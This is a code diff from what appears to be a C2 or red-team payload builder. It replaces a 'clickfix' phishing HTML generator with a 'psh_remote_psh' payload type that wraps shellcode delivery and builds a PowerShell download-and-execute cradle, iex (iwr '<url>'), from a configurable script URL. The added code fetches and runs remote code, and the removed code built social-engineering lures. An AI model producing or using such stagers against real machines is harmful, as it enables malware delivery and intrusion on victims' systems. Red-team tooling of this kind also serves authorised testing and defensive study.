@@ -10,19 +10,24 @@ import shutil
 import base64
 import random
 
-class clickfix(PayloadType):
-    name = "clickfix"
-    file_extension = "html"
+class psh_remote_psh(PayloadType):
+    name = "psh_remote_psh"
+    file_extension = "ps1"
     author = "@hegusung"
     supported_os = [SupportedOS.Windows]
     wrapper = True
-    wrapped_payloads = ["powershell_to_cmd", "cmd_regsvr32_remote_sct"]
-    note = """Creates a clickfix payload"""
+    wrapped_payloads = ["psh_wraps_shellcode"]
+    note = """Downloads a powershell script will be downloaded and executed"""
     translation_container = None # "myPythonTranslation"
-    agent_path = pathlib.Path(".") / "phishingkit"
-    agent_icon_path = agent_path / "agent_functions" / "phishing.svg"
+    agent_path = pathlib.Path(".") / "powershell"
+    agent_icon_path = agent_path / "agent_functions" / "powershell.svg"
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
+        BuildParameter(
+            name = "ps1_url",
+            parameter_type=BuildParameterType.String,
+            description="Powershell script to be downloaded and executed",
+        ),
     ]
 
     build_steps = [
@@ -35,19 +40,11 @@ class clickfix(PayloadType):
         build_msg = ""
 
         try:
-            cmd_payload = self.wrapped_payload.decode()
-            cmd_payload = cmd_payload.replace('"', '\\"')
+            url = self.get_parameter("ps1_url")
+            
+            payload = """iex (iwr '%s')""" % url
 
-            f = open(os.path.join(self.agent_code_path, "clickfix.html.template"), 'r')
-            clickfix_template = f.read()
-            f.close()
-
-            clickfix_args = {
-                "payload": cmd_payload,
-            }
-
-
-            resp.payload = clickfix_template.format(**clickfix_args)
+            resp.payload = payload
             resp.build_message = "Successfully built!\n"
 
         except Exception as e:
